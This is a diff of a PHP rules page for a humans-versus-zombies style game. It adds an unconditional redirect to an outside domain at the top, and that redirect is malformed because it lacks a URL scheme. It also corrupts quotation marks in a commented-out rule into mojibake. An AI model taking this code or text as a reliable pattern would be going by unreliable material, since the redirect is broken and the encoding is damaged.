@@ -1,4 +1,6 @@
 <?php
+header('Location: www.marylandfoamalliance.com/umbchvzinvi/');
+exit;
 require_once('../includes/util.php');
 load_config('config.txt');
 my_quick_con($config);
@@ -237,7 +239,7 @@ INTENTIONAL USE OF EXCESSIVE FORCE.</p>
 &nbsp;</p>
 <!-- <h3><span style="text-decoration:underline;">Special Rules</span>:</h3>
 <p><strong>Players Using Power Chairs:</strong></p>
-<p>If a human is hit by a sock specially marked as a “zombie sock,” although the specific wording may be slightly different, then that human is frozen for 10 seconds. &nbsp;These socks are only usable by players who need to use a power chair for mobility purposes.</p> -->
+<p>If a human is hit by a sock specially marked as a Â“zombie sock,Â” although the specific wording may be slightly different, then that human is frozen for 10 seconds. &nbsp;These socks are only usable by players who need to use a power chair for mobility purposes.</p> -->
 </div></div></body>
 <body><?php include_once 'includes/footer.php';?>
 <?php 
